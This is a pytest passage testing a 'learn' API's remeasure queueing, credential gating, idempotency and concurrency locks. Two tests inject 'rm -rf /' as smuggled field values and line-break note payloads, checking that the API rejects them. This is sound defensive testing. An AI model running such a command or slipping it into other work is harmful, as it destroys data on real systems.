    assert r.status_code == 201, r.text
    d = r.json()
    assert d["run_ids"] == gated and len(gated) == 1 and d["n_needed"] == 8
    (run,) = [env.get(f"/runs/{rid}").json() for rid in d["run_ids"]]
    assert run["status"] == "queued" and run["builder"] == "editblock"
    assert run["task_ids"] == request["task_ids"] and run["mode"] == "sighted"
    assert env.get("/runs").json()["total"] == before + 1
    (event,) = _queued_events(env)
    assert event.actor == user_id(USERS["admin"])
    assert event.payload_json["cell"] == READ_CELL and event.payload_json["run_ids"] == d["run_ids"]
    assert event.payload_json["arm"] == "S3"
    assert event.payload_json["reading_id"] == reading["reading_id"]
    assert event.payload_json["apparatus"] == APPARATUS_VERSION


def test_a_cell_with_no_registered_reading_is_offered_registration_and_queues_nothing(
    env: Env, builder_keys: None
) -> None:
    """ADR-0026 item 2: rows graded before a reading is registered never count, and a commit
    graded under an arm can no longer enter that arm's reading (``pool_seen``). So every cell
    of the seed — rows, no reading — is offered registration with no request, and queueing it
    is refused 422 ``reading_unregistered`` with nothing queued or recorded."""
    del builder_keys
    _add_stale_rows(env)
    plan = env.get(f"/learn/remeasure?repo={ALPHA}").json()
    assert plan["cells"] and plan["summary"]["cells_pending"] == 0
    for c in plan["cells"]:
        assert c["next_act"] == "register" and c["requests"] == [], c
        assert "register a reading" in c["note"]
    stale = next(c for c in plan["cells"] if c["label"] == STALE_CELL and c["reason"] == "stale")
    assert stale["n_needed"] == plan["min_n"] == 20
    before = env.get("/runs").json()["total"]
    r = _queue(env, cell=STALE_CELL)
    assert r.status_code == 422, r.text
    assert envelope(r)["code"] == "reading_unregistered"
    assert "register a reading" in envelope(r)["message"]
    assert env.get("/runs").json()["total"] == before and _queued_events(env) == []


def test_a_reading_this_deployment_cannot_write_rows_for_queues_nothing(
    env: Env, builder_keys: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A replayed arm counts only rows graded in the reading's posture (sealed). A deployment
    that grades on the host would write rows the reading can never count, so the cell says so
    and queueing it is refused with nothing queued; an ``S1`` arm is asked for only when the
    deployment's test author is the arm's author."""
    del builder_keys
    pool = _add_reading(env, hierarchy=("S3", f"S1@{PROVEN_AUTHOR}"))["pool"]
    host = _read_cell(env)
    assert host["requests"] == [] and host["next_act"] == "runs"
    assert "docker/copy/sealed" in host["note"]
    before = env.get("/runs").json()["total"]
    r = _queue(env, cell=READ_CELL)
    assert r.status_code == 422 and "docker/copy/sealed" in envelope(r)["message"]
    assert env.get("/runs").json()["total"] == before and _queued_events(env) == []
    # sealed, and the S3 ceiling delivered: the reading waits on S1@<author>
    _sealed(env, monkeypatch)
    add_proven_rows(env.factory, pool[:20], arm="S3")
    s1 = _read_cell(env)
    assert s1["requests"] == [] and PROVEN_AUTHOR in s1["note"]  # no author configured
    monkeypatch.setattr(env.settings.factory, "test_author", f"editblock:{PROVEN_AUTHOR}")
    authored = _read_cell(env)
    (req,) = authored["requests"]
    assert (req["kind"], req["mode"], req["arm"]) == ("blind", "blind", "S1")
    assert req["task_ids"] == pool[:20]


def test_queueing_refuses_a_cell_whose_builder_has_no_credential(
    env: Env, monkeypatch: pytest.MonkeyPatch
) -> None:
    """P-003's class on the Learn write: ``POST /runs`` refuses a build whose builder has no
    credential, because every attempt could only fail at $0. Queueing the plan's runs goes
    through the SAME submit gate, for every run of the cell before any is enqueued, so the
    whole cell is refused with nothing queued and nothing on the chain."""
    for key in ("ANTHROPIC_API_KEY", "CEREBRAS_API_KEY"):
        monkeypatch.delenv(key, raising=False)
    _sealed(env, monkeypatch)
    _add_reading(env)
    before = env.get("/runs").json()["total"]
    r = _queue(env, cell=READ_CELL)
    assert r.status_code == 422, r.text
    err = envelope(r)
    assert err["code"] == "builder_credential_missing"
    assert "nothing was queued" in err["message"]
    assert err["detail"]["builder"] == "editblock"
    assert env.get("/runs").json()["total"] == before
    assert _queued_events(env) == []


def test_a_what_if_plan_queues_nothing(
    env: Env, builder_keys: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A plan read against another apparatus (the CLI's ``--apparatus``) is a preview: its
    runs would grade under the RUNNING apparatus and could never clear the plan they were
    queued from. The server refuses it, not only the page, with nothing queued."""
    del builder_keys
    _sealed(env, monkeypatch)
    _add_reading(env)
    whatif = env.get(f"/learn/remeasure?repo={ALPHA}&apparatus=9.9").json()
    assert whatif["cells"], whatif
    before = env.get("/runs").json()["total"]
    for cell in (whatif["cells"][0]["label"], READ_CELL):
        r = _queue(env, cell=cell, apparatus="9.9")
        assert r.status_code == 422, r.text
        assert envelope(r)["code"] == "validation_error"
        assert "what-if" in envelope(r)["message"]
        assert APPARATUS_VERSION in envelope(r)["message"]
    assert env.get("/runs").json()["total"] == before
    assert _queued_events(env) == []
    # naming the running apparatus is the same as naming none
    assert _queue(env, cell=READ_CELL, apparatus=APPARATUS_VERSION).status_code == 201


def test_a_cell_whose_runs_are_in_flight_is_not_queued_again(
    env: Env, builder_keys: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Queueing spends money, so it is idempotent while the runs it queued are unfinished:
    the plan is derived from graded rows only, so it still holds the cell after the first
    queue, and a double click or a second operator would otherwise spend the estimate twice.
    The second request is refused 409 ``remeasure_already_queued`` naming the runs, nothing is
    queued, the plan serves the runs in flight beside the cell, and once they finish the cell
    may be queued again."""
    del builder_keys
    _sealed(env, monkeypatch)
    _add_reading(env)
    first = _queue(env, cell=READ_CELL)
    assert first.status_code == 201, first.text
    run_ids = first.json()["run_ids"]
    total = env.get("/runs").json()["total"]
    again = _queue(env, cell=READ_CELL)
    assert again.status_code == 409, again.text
    assert envelope(again)["code"] == "remeasure_already_queued"
    assert sorted(envelope(again)["detail"]["run_ids"]) == sorted(run_ids)
    assert env.get("/runs").json()["total"] == total
    assert len(_queued_events(env)) == 1
    assert sorted(_read_cell(env)["in_flight_run_ids"]) == sorted(run_ids)
    # a what-if plan never offers the queue, and says nothing of what is in flight
    whatif = env.get(f"/learn/remeasure?repo={ALPHA}&apparatus=9.9").json()
    assert all(c["in_flight_run_ids"] == [] for c in whatif["cells"])
    # the runs finish without grading the cell: it may be queued again
    with env.factory() as s:
        for rid in run_ids:
            run = s.get(Run, rid)
            assert run is not None
            run.status = "failed"
        s.commit()
    assert _queue(env, cell=READ_CELL).status_code == 201


def test_queueing_refuses_a_cell_the_plan_does_not_hold(env: Env) -> None:
    """A cell that is not in the plan — or is not planned in the mode asked for, since
    sighted and blind are never pooled — is refused with the plan's own cells named."""
    legacy = _legacy_cell(env)
    before = env.get("/runs").json()["total"]
    missing = _queue(env, cell="replay|nope|S")
    assert missing.status_code == 422 and envelope(missing)["code"] == "validation_error"
    assert envelope(missing)["detail"]["available"]
    wrong_mode = _queue(env, cell=legacy, mode="blind")
    assert wrong_mode.status_code == 422
    assert env.get("/runs").json()["total"] == before  # nothing was queued


def test_every_learn_write_refuses_a_field_it_does_not_name(env: Env) -> None:
    """The caller names an id; the product composes the body and the session is the decider.
    A request that also supplies a decider, a composed corpus line, an item body or run
    bodies is refused 422 whole — never accepted with the extra field ignored — and nothing
    is written."""
    _add_protocol_row(env)
    writes = _learn_writes(env)
    runs_before = env.get("/runs").json()["total"]
    smuggled: list[dict[str, Any]] = [
        {"decided_by": "somebody else"},
        {"line": "rm -rf /"},
        {"items": [{"id": "x", "title": "composed by the caller"}]},
        {"requests": [{"repo": ALPHA, "kind": "replay", "builder": "editblock"}]},
    ]
    for path, body in writes:
        for extra in smuggled:
            r = env.post(path, json={**body, **extra})
            assert r.status_code == 422, (path, extra, r.text)
            assert envelope(r)["code"] == "validation_error", (path, extra, r.text)
    _nothing_written(env, runs_before)


def test_a_note_is_one_line_so_it_can_never_write_a_corpus_line(env: Env) -> None:
    """The note is written into the corpus as a provenance COMMENT. A line break in it would
    end the comment and put the rest of the note in the corpus as a line nobody decided and
    no event names — so the API refuses a note with any line break, before anything is
    written (P-161)."""
    _add_protocol_row(env)
    gid = _group(env, "archaeology")["group_id"]
    for brk in ("\n", "\r", "\r\n", "\u2028", "\x85", "\x0b"):
        r = _accept(env, gid, "honest", note=f"fine{brk}rm -rf / --no-preserve-root")
        assert r.status_code == 422, (repr(brk), r.text)
        assert envelope(r)["code"] == "validation_error"
    assert not (env.settings.home / "learn" / "corpus").exists()
    with env.factory() as s:
        assert list(s.execute(select(Event).where(Event.action.like("learn.%"))).scalars()) == []


def test_the_reports_and_their_writes_read_the_repositorys_own_checks_arm(
    env: Env, builder_keys: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """ADR-0024: a row graded with belt 6 on is never counted with one graded without. The
    strengthen and remeasure reads, and the register and queue writes that re-derive them,
    read the arm the repository grades under now — rows AND registered readings — so a write
    can never act on a cell its report did not show, and a switch of arm moves both together."""
    del builder_keys
    from crb.core.checks import LABEL_CHECKS
    from crb.core.ledger import LABEL_API_STABLE

    # the stamp the adapter writes with belt 6 switched on by the repository
    belt6 = "fmt=0:default;gate=0:default;api=1:repo;cfg=0123456789ab"
    _add_stale_rows(env, labels={LABEL_CHECKS: belt6, LABEL_API_STABLE: "true"})
    legacy = _legacy_cell(env)
    item_id = env.get(f"/learn/strengthen?repo={ALPHA}").json()["items"][0]["id"]
    _sealed(env, monkeypatch)
    _add_reading(env)  # registered while every switch is off: it reads the off arm

    def cells() -> dict[str, set[str]]:
        r = env.get(f"/learn/remeasure?repo={ALPHA}")
        assert r.status_code == 200, r.text
        out: dict[str, set[str]] = {}
        for c in r.json()["cells"]:
            out.setdefault(c["label"], set()).add(c["reason"])
        return out

    def planned() -> list[str]:
        return sorted(label for label, reasons in cells().items() if "stale" in reasons)

    # every switch off: the belt-6 rows are another arm's, and neither read nor write sees them
    # — the cell reads thin on this arm's own rows, never stale on the other arm's; the
    # reading registered on this arm waits on its look
    assert planned() == [legacy]
    assert cells()[STALE_CELL] == {"thin"} and cells()[READ_CELL] == {"look_pending"}
    # the repository switches belt 6 on: only the belt-6 arm is read, by the reads AND writes
    assert env.put(f"/repos/{ALPHA}", json={"checks": {"api_stable": True}}).status_code == 200
    assert planned() == [STALE_CELL]
    assert READ_CELL not in cells()  # its reading counts the off arm's rows only
    before = env.get("/runs").json()["total"]
    assert _queue(env, cell=legacy).status_code == 422
    gone = _queue(env, cell=READ_CELL)
    assert gone.status_code == 422 and envelope(gone)["code"] == "validation_error"
    strengthen = env.get(f"/learn/strengthen?repo={ALPHA}")
    assert strengthen.status_code == 200, strengthen.text
    assert "bug.fix|S" not in strengthen.json()["cells_flagged"]
    stale = env.post(f"/learn/strengthen/register?repo={ALPHA}", json={"item_ids": [item_id]})
    assert stale.status_code == 422 and envelope(stale)["detail"]["unknown"] == [item_id]
    # the write finds the belt-6 cell its report shows, and refuses it for want of a reading
    unregistered = _queue(env, cell=STALE_CELL)
    assert unregistered.status_code == 422, unregistered.text
    assert envelope(unregistered)["code"] == "reading_unregistered"
    assert env.get("/runs").json()["total"] == before


# ---------------------------------------------------------------------------
# concurrency: the writes hold what they read until they commit (EI-1, EI-7)
# ---------------------------------------------------------------------------


def _status(r: Any) -> Any:
    return r.status_code if hasattr(r, "status_code") else type(r).__name__


def test_two_simultaneous_queues_of_one_cell_spend_the_estimate_once(
    env: Env, builder_keys: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """EI-1: the in-flight guard (P-182) was check-then-act — two requests that both read "no
    runs in flight" both queued, so one operator's intent spent the estimate twice
    (runs 8 -> 12 on the attack). The guard is now read under the store's write lock, and
    the runs and their event are one transaction: exactly one request queues, the other is
    refused 409 naming the first request's runs."""
    del builder_keys
    import crb.server.routes.learn as learn_routes

    _sealed(env, monkeypatch)
    _add_reading(env)
    before = env.get("/runs").json()["total"]
    pause_after(monkeypatch, learn_routes, "in_flight_runs", threading.Barrier(2))
    results = at_once(lambda: _queue(env, cell=READ_CELL), lambda: _queue(env, cell=READ_CELL))
    assert sorted(map(_status, results)) == [201, 409], [getattr(r, "text", r) for r in results]
    won = next(r for r in results if r.status_code == 201)
    lost = next(r for r in results if r.status_code == 409)
    assert envelope(lost)["code"] == "remeasure_already_queued"
    assert sorted(envelope(lost)["detail"]["run_ids"]) == sorted(won.json()["run_ids"])
    assert env.get("/runs").json()["total"] == before + len(won.json()["run_ids"])
    (event,) = _queued_events(env)
    assert event.payload_json["run_ids"] == won.json()["run_ids"]


def test_a_prevention_record_landing_while_a_queue_commits_costs_nothing(
    env: Env, builder_keys: None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """EI-1: the worker's post-run ``learning_tick`` writes the prevention chain onto the same
    ``learn:<repo>`` trace. When its record landed between the route's read of the trace and
    its commit, the route answered a 500 with the runs ALREADY queued and no
    ``learn.remeasure.queued`` event — so the guard could not see them and the retry queued
    the cell again. Now the worker's append waits for the route's commit and chains after
    it: one 201, the runs once, their event, and the prevention record, in order."""
    del builder_keys
    from sqlalchemy.exc import IntegrityError

    import crb.server.routes.learn as learn_routes
    from crb.server.prevention_state import ConcurrentAppend, EventsPreventionStore
    from prevention_fixtures import switched

    _sealed(env, monkeypatch)
    _add_reading(env)
    before = env.get("/runs").json()["total"]
    tick: dict[str, Any] = {}

    def _learning_tick() -> None:
        # the worker's writer with learning_tick's own retry on a concurrent append
        for _ in range(3):
            try:
                with env.factory() as s:
                    rec = EventsPreventionStore(s, ALPHA).append(switched("off", i=1, repo=ALPHA))
                    s.commit()
                    tick["record"] = rec
                    return
            except (IntegrityError, ConcurrentAppend):
                continue

    real = learn_routes.append_system_event
    worker = threading.Thread(target=_learning_tick)

    def append_then_race(*args: Any, **kwargs: Any) -> Any:
        out = real(*args, **kwargs)
        if not worker.is_alive() and "record" not in tick:
            worker.start()
            worker.join(timeout=1.0)  # the old code let the worker commit here
        return out

    monkeypatch.setattr(learn_routes, "append_system_event", append_then_race)
    r = _queue(env, cell=READ_CELL)
    worker.join(timeout=30)
    assert r.status_code == 201, r.text
    assert "record" in tick, "the worker's prevention record was lost"
    assert env.get("/runs").json()["total"] == before + len(r.json()["run_ids"])
    with env.factory() as s:
        events = list(
            s.execute(
                select(Event)
                .where(Event.trace_id == learn_routes.learn_trace_id(ALPHA))
                .order_by(Event.seq)
            ).scalars()
        )
    actions = [e.action for e in events]
    assert actions[-2:] == ["learn.remeasure.queued", "learn.prevention.recorded"]
    assert [e.seq for e in events] == list(range(1, len(events) + 1))
    assert events[-2].payload_json["run_ids"] == r.json()["run_ids"]


def test_two_operators_accepting_two_classes_at_once_both_land_on_the_record(
    env: Env, monkeypatch: pytest.MonkeyPatch
) -> None:
    """EI-1: two decisions on one repository at once both read the ``learn:<repo>`` trace's
    last ``seq``; the second commit broke ``uq_events_trace_seq`` and answered a 500 AFTER
    its corpus line was written, so the corpus held two lines and the product's record one
    decision. The event is now allocated under the write lock: both decisions are served."""
    import crb.server.routes.learn as learn_routes

    _add_protocol_row(env)
    arch, net = _group(env, "archaeology"), _group(env, "network")
    pause_after(monkeypatch, learn_routes, "append_system_event", threading.Barrier(2))
    results = at_once(
        lambda: _accept(env, arch["group_id"], "honest"),
        lambda: _accept(env, net["group_id"], "refuse"),
    )
    assert list(map(_status, results)) == [201, 201], [getattr(r, "text", r) for r in results]
    served = env.get(f"/learn/refusals?repo={ALPHA}").json()["decisions"]
    assert sorted(d["group_id"] for d in served) == sorted([arch["group_id"], net["group_id"]])


def test_two_simultaneous_first_registrations_keep_both_items(
    env: Env, monkeypatch: pytest.MonkeyPatch
) -> None:
    """EI-7: with no backlog yet, two registrations both read "none", both FROZE a backlog, and
    the second replaced the first — an item on the evidence chain and in its 201 that the
    active backlog does not hold. Registration is now one locked read-modify-write: the
    second sees the first's freeze and evolves onto it."""
    from crb.server.factory_state import FactoryHome

    items = env.get(f"/learn/strengthen?repo={ALPHA}").json()["items"]
    first, second = items[0]["id"], items[1]["id"]
    pause_after(monkeypatch, FactoryHome, "load_backlog", threading.Barrier(2))

    def register(item_id: str) -> Callable[[], Any]:
        return lambda: env.post(
            f"/learn/strengthen/register?repo={ALPHA}", json={"item_ids": [item_id]}
        )

    results = at_once(register(first), register(second))
    assert list(map(_status, results)) == [201, 201], [getattr(r, "text", r) for r in results]
    assert sorted(r.json()["registered"][0]["how"] for r in results) == ["evolved", "frozen"]
    active = FactoryHome(env.settings.home, ALPHA).load_backlog()
    assert active is not None
    assert {first, second} <= {i.id for i in active.all_items()}
